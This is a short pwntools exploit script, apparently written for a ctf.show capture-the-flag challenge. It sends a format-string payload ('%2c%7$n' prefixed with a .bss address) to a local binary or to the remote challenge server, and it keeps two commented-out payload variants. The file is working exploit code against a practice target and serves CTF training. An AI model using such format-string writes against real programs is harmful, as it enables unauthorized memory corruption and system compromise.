from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('pwn.challenge.ctf.show', 28217)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    bss = 0x0804B038
    #payload  = b'%6c%11$n'.ljust(16, b'\x00') + p32(bss)

    #payload = b'%6c%9$n\x00' + p32(bss)

    payload = p32(bss) + b'%2c%7$n\x00' 

    p.send(payload)


    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()